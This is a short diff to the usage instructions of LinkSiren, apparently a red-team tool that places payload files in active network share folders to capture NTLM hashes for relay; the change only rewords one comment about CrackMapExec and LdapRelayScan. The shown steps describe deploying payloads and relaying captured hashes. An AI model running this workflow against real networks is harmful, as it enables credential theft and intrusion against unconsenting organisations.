@@ -33,7 +33,7 @@ python link_siren.py --username <username> --password <password> --domain <domai
 # 3. Use LinkSiren to deploy payloads to all of the active folders
 #    --identify saves UNC paths to active folders in folder_targets.txt
 python link_siren.py --username <username> --password <password> --domain <domain.tld> --targets folder_targets.txt --deploy
-# 4. Let the hashes come to you and relay them as you see fit :) (I recommend CrackMapExec and LdapRelayScan)
+# 4. Let the hashes come to you and relay them as you see fit :) (I recommend CrackMapExec and LdapRelayScan for target identification)
 # 5. Cleanup the payload files when you're finished gathering.
 #    Set targets to a file containing UNC paths of all folders where payloads were written
 #    Note: If you set a custom payload name when deploying, you must set the same name here
